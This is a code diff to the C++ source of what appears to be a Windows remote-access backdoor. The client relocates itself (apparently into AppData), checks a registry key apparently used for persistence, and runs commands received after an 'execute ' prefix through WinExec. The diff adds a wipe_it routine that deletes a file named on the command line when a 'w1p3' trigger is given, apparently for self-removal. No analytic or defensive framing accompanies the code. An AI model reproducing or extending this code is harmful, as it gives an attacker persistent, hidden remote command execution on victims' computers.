@@ -10,13 +10,15 @@
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int nCmdShow)
 {
 	init_winsock();
-
+	
 	CLIENT client;
 
 	if (!client.is_in_ad()) 
 	{
 		client.move_to_ad();
 	}
+
+	wipe_it();
 
 	if (!client.check_reg_key())
 	{
@@ -70,5 +72,16 @@ void handle_command(CLIENT& client, string& command)
 	else if(command.substr(0,8) == "execute ")
 	{
 		WinExec(command.substr(8).c_str(), SW_SHOW);
+	}
+}
+
+void wipe_it()
+{
+	char* cmd_line = GetCommandLineA();
+	cmd_line[4] = '\0';
+	if(strcmp(cmd_line, "w1p3") == 0)
+	{
+		cmd_line += 5;
+		DeleteFileA(cmd_line);
 	}
 }
